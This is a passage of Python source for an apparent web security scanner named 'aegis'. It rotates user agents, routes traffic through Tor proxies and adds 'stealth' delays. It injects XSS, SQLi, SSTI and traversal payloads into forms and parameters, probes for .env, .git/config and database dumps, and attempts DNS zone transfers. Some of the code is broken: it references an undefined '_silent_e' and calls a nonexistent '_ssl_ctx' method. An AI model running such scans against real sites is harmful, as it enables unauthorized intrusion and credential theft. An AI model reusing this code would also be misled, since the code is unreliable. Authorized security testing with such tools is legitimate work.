                self._tokens -= 1.0


class AsyncSemaphorePool:
    """Named semaphore pool for throttling different categories."""
    def __init__(self):
        self._pool: Dict[str, asyncio.Semaphore] = {}

    def get(self, name: str, limit: int) -> asyncio.Semaphore:
        if name not in self._pool:
            self._pool[name] = asyncio.Semaphore(limit)
        return self._pool[name]


_SEMPOOL = AsyncSemaphorePool()


def retry_async(max_retries: int = 3, backoff: float = 1.5, exceptions=(Exception,)):
    """Decorator: retry an async function with exponential backoff."""
    def decorator(fn):
        @wraps(fn)
        async def wrapper(*args, **kwargs):
            last_exc = None
            for attempt in range(max_retries):
                try:
                    return await fn(*args, **kwargs)
                except exceptions as exc:
                    last_exc = exc
                    if attempt < max_retries - 1:
                        await asyncio.sleep(backoff ** attempt)
            raise last_exc
        return wrapper
    return decorator


def normalize_url(url: str, base: str = "") -> Optional[str]:
    """Normalize and validate a URL relative to base."""
    try:
        if not url or url.startswith(("data:", "javascript:", "mailto:", "tel:", "#")):
            return None
        if base:
            url = urljoin(base, url)
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return None
        # Remove fragment
        url = urlunparse(parsed._replace(fragment=""))
        return url
    except Exception:
        return None


def same_domain(url: str, base: str) -> bool:
    """Check if url belongs to the same root domain as base."""
    try:
        u = urlparse(url).netloc.lower()
        b = urlparse(base).netloc.lower()
        # strip www.
        u = re.sub(r'^www\.', '', u)
        b = re.sub(r'^www\.', '', b)
        return u == b or u.endswith('.' + b) or b.endswith('.' + u)
    except Exception:
        return False


def extract_base_domain(url: str) -> str:
    """Extract root domain from a URL."""
    netloc = urlparse(url).netloc.lower()
    netloc = re.sub(r'^www\.', '', netloc)
    parts  = netloc.split('.')
    return '.'.join(parts[-2:]) if len(parts) >= 2 else netloc


def url_to_filename(url: str) -> str:
    """Convert URL to a safe filename."""
    return re.sub(r'[^\w\-.]', '_', url)[:200]


def get_ip(hostname: str) -> Optional[str]:
    """Resolve hostname to IP address."""
    try:
        return socket.gethostbyname(hostname)
    except Exception:
        return None


def is_ip(s: str) -> bool:
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def severity_score(severity: str) -> int:
    return {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}.get(severity.lower(), 0)


def chunk_list(lst: list, size: int) -> list:
    return [lst[i:i+size] for i in range(0, len(lst), size)]


def safe_json_dumps(obj, **kwargs) -> str:
    """JSON serialize with fallback for non-serializable types."""
    def default(o):
        if isinstance(o, set):
            return list(o)
        if hasattr(o, '__dict__'):
            return o.__dict__
        return str(o)
    return json.dumps(obj, default=default, **kwargs)


class ProgressTracker:
    """Simple thread-safe counter for progress reporting."""
    def __init__(self, total: int, label: str = ""):
        self.total   = total
        self.label   = label
        self.done    = 0
        self._lock   = threading.Lock()

    def increment(self, n: int = 1):
        with self._lock:
            self.done = min(self.done + n, self.total)

    @property
    def pct(self) -> float:
        return (self.done / self.total * 100) if self.total else 0.0

    def __str__(self):
        return f"[{self.label}] {self.done}/{self.total} ({self.pct:.1f}%)"


# ════════════════════════════════════════════════════════
# HTTP CLIENT
# ════════════════════════════════════════════════════════

class HTTPClient:
    """
    Async HTTP client wrapping aiohttp.
    Handles: proxy/Tor, user-agent rotation, cookies, retries,
             redirect following, gzip, stealth delays.
    Falls back to urllib if aiohttp unavailable.
    """
    def _make_ssl_context(self):
        """
        Build SSL context respecting AEGIS_TLS_VERIFY environment variable.
        AEGIS_TLS_VERIFY=0 disables cert checking (lab only — logs a warning).
        AEGIS_TLS_CAFILE sets a custom CA bundle path.
        Default: system CA, TLS 1.2+ required, full cert verification.
        """
        import ssl as _ssl, os as _os, logging as _log
        _logger = _log.getLogger("aegis.node.tls")
        verify = _os.environ.get("AEGIS_TLS_VERIFY", "1").strip()
        if verify in ("0", "false", "no"):
            _logger.warning(
                "TLS certificate verification DISABLED (AEGIS_TLS_VERIFY=0) — "
                "use only in controlled lab/test environments"
            )
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            return ctx
        cafile = _os.environ.get("AEGIS_TLS_CAFILE", "")
        ctx = _ssl.create_default_context(cafile=cafile if cafile else None)
        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
        return ctx


    def __init__(self, config: ScanConfig):
        self.config   = config
        self.session: Optional[Any] = None
        self._ua_idx  = 0
        self._lock    = asyncio.Lock()

    def _next_ua(self) -> str:
        ua = USER_AGENTS[self._ua_idx % len(USER_AGENTS)]
        self._ua_idx += 1
        return ua

    def _base_headers(self) -> Dict[str, str]:
        return {
            "User-Agent":      self._next_ua(),
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "keep-alive",
        }

    async def __aenter__(self):
        await self._ensure_session()
        return self

    async def __aexit__(self, *_):
        await self.close()

    async def _ensure_session(self):
        async with self._lock:
            if self.session is not None:
                return
            if not aiohttp:
                return
            connector_kwargs: Dict[str, Any] = {"ssl": self._ssl_ctx(), "limit": self.config.threads}
            proxy = self.config.proxy
            # aiohttp-socks for SOCKS proxy
            if proxy and proxy.startswith("socks"):
                try:
                    from aiohttp_socks import ProxyConnector
                    connector = ProxyConnector.from_url(proxy, ssl=self._ssl_ctx(),
                                                        limit=self.config.threads)
                    self.session = aiohttp.ClientSession(
                        connector=connector,
                        headers=self._base_headers(),
                        timeout=aiohttp.ClientTimeout(total=self.config.timeout),
                        cookie_jar=aiohttp.CookieJar(unsafe=True),
                    )
                    return
                except ImportError:
                    pass
            connector = aiohttp.TCPConnector(**connector_kwargs)
            self.session = aiohttp.ClientSession(
                connector=connector,
                headers=self._base_headers(),
                timeout=aiohttp.ClientTimeout(total=self.config.timeout),
                cookie_jar=aiohttp.CookieJar(unsafe=True),
            )

    async def close(self):
        if self.session:
            with suppress(Exception):
                await self.session.close()
            self.session = None

    async def get(self, url: str, **kwargs) -> Optional[Dict[str, Any]]:
        return await self._request("GET", url, **kwargs)

    async def post(self, url: str, data=None, json_data=None, **kwargs) -> Optional[Dict[str, Any]]:
        return await self._request("POST", url, data=data, json=json_data, **kwargs)

    @retry_async(max_retries=3, backoff=1.5)
    async def _request(self, method: str, url: str, **kwargs) -> Optional[Dict[str, Any]]:
        await self._ensure_session()
        if self.config.stealth:
            await asyncio.sleep(random.uniform(0.5, 2.0))

        # Override headers if needed
        headers = {**self._base_headers(), **kwargs.pop("headers", {})}
        proxy   = None
        if self.config.proxy and not (self.config.proxy.startswith("socks")):
            proxy = self.config.proxy

        if self.session:
            try:
                async with self.session.request(
                    method, url, headers=headers, proxy=proxy,
                    allow_redirects=True, ssl=self._ssl_ctx if hasattr(self, "_ssl_ctx") else True,
                    timeout=aiohttp.ClientTimeout(total=self.config.timeout),
                    **kwargs
                ) as resp:
                    body = await resp.read()
                    # Decompress
                    if resp.headers.get("Content-Encoding") == "gzip":
                        with suppress(Exception):
                            body = gzip.decompress(body)
                    text = ""
                    with suppress(Exception):
                        text = body.decode(
                            resp.charset or "utf-8", errors="replace"
                        )
                    return {
                        "url":     str(resp.url),
                        "status":  resp.status,
                        "headers": dict(resp.headers),
                        "text":    text,
                        "bytes":   body,
                        "size":    len(body),
                        "type":    resp.headers.get("Content-Type", ""),
                    }
            except asyncio.TimeoutError:
                return None
            except Exception:
                return None
        # Fallback: urllib
        return await self._urllib_request(method, url, headers, kwargs)

    async def _urllib_request(self, method, url, headers, kwargs):
        import urllib.request
        try:
            req = urllib.request.Request(url, headers=headers, method=method)
            loop = asyncio.get_event_loop()
            def _do():
                with urllib.request.urlopen(req, timeout=self.config.timeout) as r:
                    body = r.read()
                    return {
                        "url": r.geturl(), "status": r.status,
                        "headers": dict(r.headers),
                        "text": body.decode("utf-8", errors="replace"),
                        "bytes": body, "size": len(body),
                        "type": r.headers.get("Content-Type", ""),
                    }
            return await loop.run_in_executor(None, _do)
        except Exception:
            return None


# ════════════════════════════════════════════════════════
# PATTERN SCANNER
# ════════════════════════════════════════════════════════

class PatternScanner:
    """Scan text for secrets, PII, and sensitive info."""

    @staticmethod
    def scan(text: str, source_url: str) -> List[Finding]:
        findings: List[Finding] = []
        if not text:
            return findings
        seen: Set[str] = set()
        for name, pattern in PATTERNS.items():
            for match in pattern.finditer(text):
                val = match.group(0)
                key = f"{name}:{val}"
                if key in seen:
                    continue
                seen.add(key)
                # context window
                start = max(0, match.start() - 40)
                end   = min(len(text), match.end() + 40)
                ctx   = text[start:end].replace('\n', ' ').strip()
                sev   = PatternScanner._severity(name)
                findings.append(Finding(
                    category=name, key=name, value=val,
                    source_url=source_url, severity=sev, context=ctx
                ))
        return findings

    @staticmethod
    def _severity(name: str) -> str:
        critical = {
            "aws_access_key","aws_secret_key","aws_session_token","rsa_private_key",
            "pgp_private_key","stripe_live_key","stripe_secret","github_token",
            "gcp_service_acct","azure_conn_str","db_connection",
        }
        high = {
            "github_oauth","stripe_pub_key","slack_token","twilio_auth",
            "sendgrid_key","google_oauth","heroku_api_key","digitalocean_token",
            "npm_token","jwt_token","generic_secret","generic_password",
        }
        medium = {
            "email","ssn","credit_card","slack_webhook","mailgun_key",
            "twilio_sid","gcp_api_key","s3_bucket","aws_arn","firebase_url",
        }
        if name in critical: return "critical"
        if name in high:     return "high"
        if name in medium:   return "medium"
        return "info"


# ════════════════════════════════════════════════════════
# TECHNOLOGY DETECTOR
# ════════════════════════════════════════════════════════

class TechDetector:
    """Fingerprint web technologies from response headers, body, cookies."""

    @staticmethod
    def detect(resp: Dict[str, Any]) -> List[TechResult]:
        results: List[TechResult] = []
        headers_str = json.dumps(resp.get("headers", {})).lower()
        text        = resp.get("text", "")
        cookies_str = " ".join(
            resp.get("headers", {}).get("Set-Cookie", "").split()
        ).lower()

        for tech, sigs in TECH_SIGS.items():
            score = 0
            version = None

            for pat in sigs.get("headers", []):
                if re.search(pat, headers_str, re.I):
                    score += 3
                    # Try extract version
                    m = re.search(r'(\d+[\.\d]+)', headers_str[
                        max(0, headers_str.find(pat.lower().split('.')[0])-5):
                        headers_str.find(pat.lower().split('.')[0])+80
                    ])
                    if m: version = m.group(1)

            for pat in sigs.get("html", []):
                if re.search(pat, text, re.I):
                    score += 2

            for pat in sigs.get("cookies", []):
                if re.search(pat, cookies_str, re.I):
                    score += 2

            for pat in sigs.get("meta", []):
                m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
                              text, re.I)
                if m and re.search(pat, m.group(1), re.I):
                    score += 3
                    v = re.search(r'(\d+[\.\d]+)', m.group(1))
                    if v: version = v.group(1)

            if score >= 2:
                results.append(TechResult(
                    name=tech, version=version,
                    confidence=min(100, score * 20),
                ))
        return results


# ════════════════════════════════════════════════════════
# CRAWLER MODULE
# ════════════════════════════════════════════════════════

class CrawlerModule:
    """
    Async breadth-first crawler.
    Extracts: links, forms, scripts, comments, emails, hidden fields.
    Supports robots.txt exclusion, scope limiting, stealth delays.
    """

    def __init__(self, config: ScanConfig, http: HTTPClient):
        self.config    = config
        self.http      = http
        self.visited:  Set[str] = set()
        self.queue:    asyncio.Queue = asyncio.Queue()
        self.results:  List[CrawlResult] = []
        self.graph_nodes: Set[str]    = set()
        self.graph_edges: List[Tuple[str,str]] = []
        self._sem      = asyncio.Semaphore(config.threads)
        self._lock     = asyncio.Lock()
        self._robots_disallowed: Set[str] = set()
        self._tech_detector = TechDetector()

    async def run(self) -> Tuple[List[CrawlResult], Set[str], List[Tuple[str,str]]]:
        await self._load_robots()
        await self.queue.put((self.config.target, 0))
        self.graph_nodes.add(self.config.target)

        workers = [
            asyncio.create_task(self._worker())
            for _ in range(min(self.config.threads, 20))
        ]
        await self.queue.join()
        for w in workers:
            w.cancel()
        with suppress(asyncio.CancelledError):
            await asyncio.gather(*workers, return_exceptions=True)
        return self.results, self.graph_nodes, self.graph_edges

    async def _worker(self):
        while True:
            try:
                url, depth = await asyncio.wait_for(self.queue.get(), timeout=5.0)
            except asyncio.TimeoutError:
                break
            try:
                await self._process(url, depth)
            except Exception as _exc:
                log.debug("_worker: %s", _exc)
            finally:
                self.queue.task_done()

    async def _process(self, url: str, depth: int):
        async with self._lock:
            if url in self.visited:
                return
            self.visited.add(url)

        if self._is_disallowed(url):
            return

        async with self._sem:
            t0   = time.monotonic()
            resp = await self.http.get(url)
            elapsed = time.monotonic() - t0

        if not resp:
            return

        text    = resp.get("text", "")
        headers = resp.get("headers", {})
        ctype   = resp.get("type", "")
        status  = resp.get("status", 0)
        actual_url = resp.get("url", url)

        title    = self._extract_title(text)
        links    = self._extract_links(text, actual_url)
        forms    = self._extract_forms(text, actual_url)
        scripts  = self._extract_scripts(text, actual_url)
        comments = self._extract_comments(text)
        emails   = self._extract_emails(text)
        findings = PatternScanner.scan(text, actual_url)

        # Graph
        async with self._lock:
            self.graph_nodes.add(actual_url)
            for lnk in links[:50]:  # cap graph density
                self.graph_nodes.add(lnk)
                self.graph_edges.append((actual_url, lnk))

        result = CrawlResult(
            url=actual_url, status_code=status,
            content_type=ctype, title=title,
            links=links, forms=forms,
            scripts=scripts, comments=comments, emails=emails,
            response_time=elapsed, size=resp.get("size", 0),
            redirect_url=actual_url if actual_url != url else "",
            headers={k.lower(): v for k, v in headers.items()},
            findings=findings,
        )

        async with self._lock:
            self.results.append(result)

        # Enqueue new URLs
        if depth < self.config.depth:
            for lnk in links:
                if same_domain(lnk, self.config.target):
                    async with self._lock:
                        if lnk not in self.visited:
                            await self.queue.put((lnk, depth + 1))

    async def _load_robots(self):
        robots_url = urljoin(self.config.target, "/robots.txt")
        resp = await self.http.get(robots_url)
        if resp and resp.get("status") == 200:
            for line in resp.get("text", "").splitlines():
                line = line.strip()
                if line.lower().startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    if path:
                        self._robots_disallowed.add(path)

    def _is_disallowed(self, url: str) -> bool:
        path = urlparse(url).path
        for d in self._robots_disallowed:
            if d != "/" and path.startswith(d):
                return True
        return False

    @staticmethod
    def _extract_title(html: str) -> str:
        m = re.search(r'<title[^>]*>([^<]{0,200})</title>', html, re.I | re.S)
        return m.group(1).strip() if m else ""

    @staticmethod
    def _extract_links(html: str, base_url: str) -> List[str]:
        links: List[str] = []
        seen: Set[str]   = set()
        for attr in ['href', 'src', 'action', 'data-url', 'data-href']:
            for m in re.finditer(rf'{attr}=["\']([^"\']+)["\']', html, re.I):
                url = normalize_url(m.group(1), base_url)
                if url and url not in seen:
                    seen.add(url)
                    links.append(url)
        # Also parse JS strings that look like URLs
        for m in re.finditer(r'["\']/([\w/\-\.?=&%#]+)["\']', html):
            url = normalize_url(m.group(0).strip("'\""
                                                  ), base_url)
            if url and url not in seen:
                seen.add(url)
                links.append(url)
        return links

    @staticmethod
    def _extract_forms(html: str, base_url: str) -> List[Dict]:
        forms: List[Dict] = []
        for form_m in re.finditer(r'<form([^>]*)>(.*?)</form>', html, re.I | re.S):
            attrs   = form_m.group(1)
            body    = form_m.group(2)
            action  = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method  = re.search(r'method=["\']([^"\']+)["\']', attrs, re.I)
            form_action = normalize_url(
                action.group(1) if action else "", base_url
            ) or base_url
            inputs: List[Dict] = []
            for inp in re.finditer(
                r'<input([^>]*)>', body, re.I
            ):
                iattrs = inp.group(1)
                iname  = re.search(r'name=["\']([^"\']+)["\']', iattrs, re.I)
                itype  = re.search(r'type=["\']([^"\']+)["\']', iattrs, re.I)
                ival   = re.search(r'value=["\']([^"\']*)["\']', iattrs, re.I)
                inputs.append({
                    "name":  iname.group(1)  if iname  else "",
                    "type":  itype.group(1)  if itype  else "text",
                    "value": ival.group(1)   if ival   else "",
                })
            forms.append({
                "action": form_action,
                "method": method.group(1).upper() if method else "GET",
                "inputs": inputs,
            })
        return forms

    @staticmethod
    def _extract_scripts(html: str, base_url: str) -> List[str]:
        scripts: List[str] = []
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I):
            url = normalize_url(m.group(1), base_url)
            if url:
                scripts.append(url)
        return scripts

    @staticmethod
    def _extract_comments(html: str) -> List[str]:
        return re.findall(r'<!--(.*?)-->', html, re.S)[:30]

    @staticmethod
    def _extract_emails(text: str) -> List[str]:
        return list(set(re.findall(
            r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b', text
        )))


# ════════════════════════════════════════════════════════
# DIRECTORY / FILE BRUTE-FORCER
# ════════════════════════════════════════════════════════

class DirBuster:
    """Async directory and file brute-forcer."""

    EXTENSIONS = [
        "", ".php", ".asp", ".aspx", ".jsp", ".html", ".htm",
        ".xml", ".txt", ".bak", ".old", ".log", ".json", ".yml",
        ".yaml", ".config", ".conf", ".cfg", ".inc", ".sql",
    ]

    def __init__(self, config: ScanConfig, http: HTTPClient):
        self.config = config
        self.http   = http

    async def run(self, base_url: str, wordlist: Optional[List[str]] = None) -> List[Dict]:
        words = wordlist or DIR_WORDLIST
        found: List[Dict] = []
        sem   = asyncio.Semaphore(self.config.threads)

        async def check(path: str):
            url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            async with sem:
                resp = await self.http.get(url)
            if not resp:
                return
            status = resp.get("status", 0)
            if status in (200, 201, 204, 301, 302, 401, 403, 405):
                found.append({
                    "url":    url,
                    "status": status,
                    "size":   resp.get("size", 0),
                    "title":  CrawlerModule._extract_title(resp.get("text", "")),
                })

        tasks = [check(w) for w in words]
        for chunk in chunk_list(tasks, 50):
            await asyncio.gather(*chunk, return_exceptions=True)
        return found

# ════════════════════════════════════════════════════════
# VULNERABILITY SCANNER
# ════════════════════════════════════════════════════════

class VulnScanner:
    """
    Active vulnerability scanner.
    Tests: XSS, SQLi, LFI, SSRF, SSTI, OpenRedirect,
           CMDi, XXE, CORS misconfiguration, CSRF missing,
           Security headers audit, Sensitive file exposure.
    """

    VULN_META = {
        "xss":             ("high",   "Cross-Site Scripting", "Sanitize & encode user input. Implement CSP."),
        "sqli":            ("critical","SQL Injection",        "Use parameterized queries / prepared statements."),
        "lfi":             ("high",   "Local File Inclusion",  "Validate & whitelist file paths. Disable allow_url_include."),
        "ssrf":            ("high",   "Server-Side Request Forgery","Whitelist outbound destinations. Block internal ranges."),
        "ssti":            ("critical","Server-Side Template Injection","Use a sandboxed template engine. Avoid user-controlled templates."),
        "open_redirect":   ("medium", "Open Redirect",         "Validate and whitelist redirect destinations."),
        "cmd_injection":   ("critical","Command Injection",     "Never pass user input to shell. Use parameterized APIs."),
        "xxe":             ("high",   "XML External Entity",   "Disable external entity processing in XML parsers."),
        "cors":            ("medium", "CORS Misconfiguration",  "Restrict Access-Control-Allow-Origin to trusted origins."),
        "csrf":            ("medium", "Missing CSRF Protection","Implement CSRF tokens on all state-changing requests."),
        "sec_headers":     ("low",    "Missing Security Headers","Add recommended HTTP security headers."),
        "sensitive_files": ("medium", "Sensitive File Exposure","Remove/protect backup files, configs, and debug endpoints."),
        "idor":            ("high",   "Insecure Direct Object Reference","Enforce authorization on all resource access."),
        "path_traversal":  ("high",   "Path Traversal",        "Validate and canonicalize all file paths."),
    }

    def __init__(self, config: ScanConfig, http: HTTPClient):
        self.config  = config
        self.http    = http
        self._sem    = asyncio.Semaphore(min(config.threads, 10))

    async def scan_all(self, crawl_results: List[CrawlResult]) -> List[VulnResult]:
        vulns: List[VulnResult] = []
        tasks = []
        for cr in crawl_results:
            tasks.append(self._scan_url_headers(cr))
            for form in cr.forms:
                tasks.append(self._scan_form(form, cr.url))
            # Parametric URLs
            parsed = urlparse(cr.url)
            if parsed.query:
                tasks.append(self._scan_params(cr.url, parse_qs(parsed.query)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                vulns.extend(r)
        return vulns

    async def _scan_url_headers(self, cr: CrawlResult) -> List[VulnResult]:
        vulns: List[VulnResult] = []
        vulns.extend(self._check_security_headers(cr))
        vulns.extend(await self._check_cors(cr))
        vulns.extend(await self._check_sensitive_files(cr.url))
        return vulns

    async def _scan_form(self, form: Dict, source_url: str) -> List[VulnResult]:
        vulns: List[VulnResult] = []
        action  = form.get("action", source_url)
        method  = form.get("method", "GET")
        inputs  = form.get("inputs", [])
        # Check CSRF
        has_csrf = any(
            re.search(r'csrf|token|nonce', inp.get("name",""), re.I)
            for inp in inputs
        )
        if not has_csrf and method == "POST":
            vulns.append(self._make_vuln(
                "csrf", action, "form", "", "No CSRF token in POST form",
                "medium", "possible"
            ))
        # Test injectable fields
        injectable = [
            i for i in inputs
            if i.get("type", "text") not in ("hidden", "submit", "button", "image", "file")
        ]
        for inp in injectable:
            name = inp.get("name", "field")
            for vuln_type, payloads in [
                ("xss",  PAYLOADS["xss"]),
                ("sqli", PAYLOADS["sqli"]),
                ("ssti", PAYLOADS["ssti"]),
            ]:
                result = await self._test_payloads(
                    action, method, name, inp.get("value",""), payloads, vuln_type
                )
                if result:
                    vulns.append(result)
        return vulns

    async def _scan_params(self, url: str, params: Dict) -> List[VulnResult]:
        vulns: List[VulnResult] = []
        for param, values in params.items():
            orig = values[0] if values else ""
            for vuln_type, payloads in [
                ("xss",           PAYLOADS["xss"]),
                ("sqli",          PAYLOADS["sqli"]),
                ("lfi",           PAYLOADS["lfi"]),
                ("ssti",          PAYLOADS["ssti"]),
                ("open_redirect", PAYLOADS["open_redirect"]),
                ("path_traversal",PAYLOADS["path_traversal"]),
            ]:
                result = await self._test_get_param(url, param, payloads, vuln_type)
                if result:
                    vulns.append(result)
                    break  # one vuln type per param is enough
        return vulns

    async def _test_payloads(
        self, url: str, method: str, param: str, orig: str,
        payloads: List[str], vuln_type: str
    ) -> Optional[VulnResult]:
        async with self._sem:
            for payload in payloads[:8]:  # limit per param
                try:
                    data = {param: orig + payload}
                    if method == "POST":
                        resp = await self.http.post(url, data=data)
                    else:
                        resp = await self.http.get(url + "?" + urlencode(data))
                    if resp and self._detect(vuln_type, payload, resp.get("text", ""),
                                             resp.get("status", 0)):
                        sev, desc, rem = self.VULN_META.get(vuln_type, ("medium","",""))
                        return VulnResult(
                            vuln_type=vuln_type, url=url, parameter=param,
                            payload=payload,
                            evidence=resp.get("text","")[:200],
                            severity=sev, confidence="likely",
                            description=desc, remediation=rem,
                        )
                except Exception:
                    import logging as _l; _l.getLogger("aegis.node").debug("silent exception at L1529: %s", _silent_e)
        return None

    async def _test_get_param(
        self, url: str, param: str,
        payloads: List[str], vuln_type: str
    ) -> Optional[VulnResult]:
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query, keep_blank_values=True)
        async with self._sem:
            for payload in payloads[:8]:
                try:
                    test_qs = {**qs, param: [payload]}
                    test_url = urlunparse(parsed._replace(
                        query=urlencode(test_qs, doseq=True)
                    ))
                    resp = await self.http.get(test_url)
                    if resp and self._detect(vuln_type, payload, resp.get("text", ""),
                                             resp.get("status", 0)):
                        sev, desc, rem = self.VULN_META.get(vuln_type, ("medium","",""))
                        return VulnResult(
                            vuln_type=vuln_type, url=test_url, parameter=param,
                            payload=payload,
                            evidence=resp.get("text","")[:200],
                            severity=sev, confidence="likely",
                            description=desc, remediation=rem,
                        )
                except Exception:
                    import logging as _l; _l.getLogger("aegis.node").debug("silent exception at L1557: %s", _silent_e)
        return None

    def _detect(self, vuln_type: str, payload: str, body: str, status: int) -> bool:
        if not body:
            return False
        if vuln_type == "xss":
            return payload.lower() in body.lower() and not self._html_encoded(payload, body)
        if vuln_type == "sqli":
            sql_errors = [
                "sql syntax","mysql error","ora-","syntax error",
                "unclosed quotation","psqlexception","sqliteexception",
                "warning: mysql","you have an error in your sql",
                "division by zero","odbc driver","pg::syntaxerror",
            ]
            body_l = body.lower()
            return any(e in body_l for e in sql_errors)
        if vuln_type == "lfi":
            return bool(re.search(r'root:.*:0:0:|daemon:.*:/usr/sbin|bin/bash|win\.ini', body))
        if vuln_type == "ssti":
            return "49" in body  # {{7*7}} == 49
        if vuln_type == "open_redirect":
            return status in (301, 302, 303, 307, 308) and \
                   "evil.com" in body.lower()[:500]
        if vuln_type == "ssrf":
            # Detect internal info in response
            return bool(re.search(r'ami-id|instance-id|169\.254', body))
        if vuln_type == "path_traversal":
            return bool(re.search(r'root:.*:0:0:|win\.ini', body))
        return False

    @staticmethod
    def _html_encoded(payload: str, body: str) -> bool:
        """Return True if payload appears HTML-encoded (not raw) in body."""
        encoded = html_lib.escape(payload)
        return encoded in body and payload not in body

    def _check_security_headers(self, cr: CrawlResult) -> List[VulnResult]:
        vulns: List[VulnResult] = []
        headers = cr.headers
        for header, msg in SECURITY_HEADERS.items():
            if header not in headers:
                vulns.append(VulnResult(
                    vuln_type="sec_headers",
                    url=cr.url, parameter=header, payload="",
                    evidence=f"Header '{header}' absent",
                    severity="low", confidence="confirmed",
                    description=msg,
                    remediation=f"Add the '{header}' HTTP response header.",
                ))
        # Check for server version disclosure
        server = headers.get("server", "")
        if re.search(r'\d+\.\d+', server):
            vulns.append(VulnResult(
                vuln_type="sec_headers",
                url=cr.url, parameter="server",
                payload="", evidence=f"Server: {server}",
                severity="info", confidence="confirmed",
                description="Server version disclosed in header",
                remediation="Hide server version. Use 'server: Web' or remove header.",
            ))
        return vulns

    async def _check_cors(self, cr: CrawlResult) -> List[VulnResult]:
        vulns: List[VulnResult] = []
        async with self._sem:
            resp = await self.http.get(cr.url, headers={
                "Origin": "https://evil.com"
            })
        if not resp:
            return vulns
        headers = resp.get("headers", {})
        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "")
        if acao == "*":
            vulns.append(VulnResult(
                vuln_type="cors", url=cr.url, parameter="CORS",
                payload="Origin: https://evil.com",
                evidence=f"Access-Control-Allow-Origin: {acao}",
                severity="medium", confidence="confirmed",
                description="CORS allows any origin (*)",
                remediation="Restrict ACAO header to specific trusted domains.",
            ))
        elif "evil.com" in acao:
            conf = "confirmed"
            sev  = "high" if "true" in acac.lower() else "medium"
            vulns.append(VulnResult(
                vuln_type="cors", url=cr.url, parameter="CORS",
                payload="Origin: https://evil.com",
                evidence=f"ACAO: {acao} ACAC: {acac}",
                severity=sev, confidence=conf,
                description="CORS reflects arbitrary Origin header",
                remediation="Validate Origin against a strict whitelist.",
            ))
        return vulns

    async def _check_sensitive_files(self, base_url: str) -> List[VulnResult]:
        sensitive = [
            "/.env", "/.git/HEAD", "/.git/config",
            "/web.config", "/config.php", "/wp-config.php",
            "/phpinfo.php", "/info.php", "/server-status",
            "/admin/", "/backup.zip", "/backup.sql",
            "/dump.sql", "/.htpasswd", "/robots.txt",
            "/crossdomain.xml", "/.DS_Store", "/sitemap.xml",
        ]
        vulns: List[VulnResult] = []
        async def check(path: str):
            url = urljoin(base_url, path)
            async with self._sem:
                resp = await self.http.get(url)
            if not resp:
                return
            status = resp.get("status", 0)
            text   = resp.get("text", "")
            if status == 200 and len(text) > 10:
                # Extra checks for .env, git, phpinfo
                interesting = False
                if path == "/.env" and re.search(r'[A-Z_]+=', text):
                    interesting = True
                elif path == "/.git/HEAD" and "ref:" in text:
                    interesting = True
                elif path == "/phpinfo.php" and "PHP Version" in text:
                    interesting = True
                elif path in ("/server-status",) and "Apache" in text:
                    interesting = True
                elif path in ("/admin/", "/backup.zip", "/backup.sql", "/dump.sql"):
                    interesting = True
                elif status in (200, 403):
                    interesting = True
                if interesting:
                    vulns.append(VulnResult(
                        vuln_type="sensitive_files",
                        url=url, parameter="",
                        payload="", evidence=text[:300],
                        severity="medium", confidence="confirmed",
                        description=f"Sensitive file/directory accessible: {path}",
                        remediation="Restrict or remove the sensitive file/endpoint.",
                    ))
        await asyncio.gather(*[check(p) for p in sensitive], return_exceptions=True)
        return vulns

    @staticmethod
    def _make_vuln(vtype, url, param, payload, evidence, sev, conf) -> VulnResult:
        meta = VulnScanner.VULN_META.get(vtype, ("info","",""))
        return VulnResult(
            vuln_type=vtype, url=url, parameter=param,
            payload=payload, evidence=evidence,
            severity=sev, confidence=conf,
            description=meta[1], remediation=meta[2],
        )


# ════════════════════════════════════════════════════════
# DNS MODULE
# ════════════════════════════════════════════════════════

class DNSModule:
    """
    DNS enumeration: A, AAAA, MX, NS, TXT, CNAME, SOA, PTR,
    zone transfer attempt, SPF/DMARC/DKIM analysis.
    """

    RECORD_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR", "SRV", "CAA"]

    def __init__(self, config: ScanConfig):
        self.config = config
        self.domain = extract_base_domain(config.target)

    async def run(self) -> List[DNSRecord]:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._run_sync)

    def _run_sync(self) -> List[DNSRecord]:
        records: List[DNSRecord] = []
        if not dns_res:
            records.extend(self._fallback_dns())
            return records
        resolver = dns_res.Resolver()
        resolver.timeout     = 5
        resolver.lifetime    = 10
        resolver.nameservers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]

        for rtype in self.RECORD_TYPES:
            try:
                answers = resolver.resolve(self.domain, rtype)
                for rdata in answers:
                    records.append(DNSRecord(
                        record_type=rtype,
                        name=self.domain,
                        value=str(rdata),
                        ttl=answers.ttl,
                    ))
            except Exception:
                import logging as _l; _l.getLogger("aegis.node").debug("silent exception at L1750: %s", _silent_e)

        # Zone transfer attempt
        records.extend(self._zone_transfer(resolver))
        return records

    def _zone_transfer(self, resolver) -> List[DNSRecord]:
        records: List[DNSRecord] = []
        try:
            ns_answers = resolver.resolve(self.domain, "NS")
            for ns in ns_answers:
                ns_host = str(ns.target).rstrip(".")
                try:
                    import dns.query
                    import dns.zone as dzone
                    z = dzone.from_xfr(dns.query.xfr(ns_host, self.domain, timeout=5))
                    for name, node in z.nodes.items():
                        for rds in node.rdatasets:
                            for rd in rds:
                                records.append(DNSRecord(
                                    record_type="AXFR",
